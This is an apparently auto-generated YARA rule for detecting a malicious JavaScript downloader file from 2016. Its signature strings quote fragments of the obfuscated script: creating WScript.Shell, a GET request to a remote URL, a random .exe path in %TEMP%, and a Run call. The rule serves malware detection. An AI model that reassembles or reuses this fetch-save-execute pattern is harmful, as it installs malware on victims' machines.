rule sig_20160330_24d82f42b4138139e45486eee396313d {
  meta:
    description = "datamaliciousorder - file 20160330_24d82f42b4138139e45486eee396313d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "972ce80624880ca10971333f3fc62b3af06e19ac1764ce9412d2cbf0899d8438"

  strings:
    $s1  = "var _NS = function _FS() {return WScript[_HB](\"WScript\"+\".Shell\");}(), _P0 = 11;" fullword ascii
    $s2  = "_W[_LO](\"GET\", \"http://bonares.pl/x9isa\", false);" fullword ascii
    $s3  = "function _YN(_EA, _GZ0){_N = _N * 1; return _EA - _GZ0;};" fullword ascii
    $s4  = "if (_W[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _J(){return _Z + \"\";};" fullword ascii
    $s6  = "function _FQ() {return _NS[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ULIIp2nWmts6zXb.ex\" + \"e\";};" fullword ascii
    $s7  = "function _B(_Q){_NS[\"Run\"](_Q, _N, _N);};" fullword ascii
    $s8  = "function _XV() {return ((_O1 == true) && (_O1 == _F)) ? 1 : _N;};" fullword ascii
    $s9  = "var _GZ = new this[\"Date\"]();" fullword ascii
    $s10 = " while (_LS){" fullword ascii
    $s11 = "function _U(_LH) {var _L = (1, 2, 3, 4, 5, _LH); return _L;};" fullword ascii
    $s12 = "function _A(){return 22;};" fullword ascii
    $s13 = "return _YN(_WN, _IX);" fullword ascii
    $s14 = "function _QM(){return _HB;};" fullword ascii
    $s15 = "function _O()" fullword ascii
    $s16 = "var _G0 = false;" fullword ascii
    $s17 = "_O1 = true; " fullword ascii
    $s18 = "var _O1 = false;" fullword ascii
    $s19 = "_F = true; " fullword ascii
    $s20 = "} catch(_ZQ){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}